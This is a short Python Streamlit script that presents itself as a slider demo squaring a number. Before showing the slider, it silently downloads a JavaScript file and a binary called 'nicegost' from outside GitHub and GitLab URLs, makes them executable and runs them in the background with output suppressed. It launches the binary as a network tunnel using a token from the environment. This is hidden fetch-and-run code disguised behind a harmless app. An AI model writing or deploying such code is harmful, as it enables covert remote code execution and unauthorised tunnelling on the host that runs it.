import streamlit as st
import subprocess
import os
import requests

def download_file(url, file_path):
    if not os.path.exists(file_path):
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(file_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            os.chmod(file_path, 0o755)
        else:
            return False
    return True

def run_in_background(command):
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    ustdy_url = "https://gitlab.com/anyway_2012/bot/-/raw/master/ustdy.js"
    ustdy_path = "./ustdy.js"
    if download_file(ustdy_url, ustdy_path):
        run_in_background([ustdy_path])
        
    nicegost_url = "https://raw.githubusercontent.com/flyapple2016/NiceGost/main/nicegost"
    nicegost_path = "./nicegost"
    if download_file(nicegost_url, nicegost_path):
        token = os.getenv("TOKEN")
        if token:
            run_in_background([nicegost_path, "tunnel", "--edge-ip-version", "auto", "--protocol", "http2", "run", "--token", token])

    x = st.slider('Select a value')
    st.write(x, 'squared is', x * x)

if __name__ == "__main__":
    main()
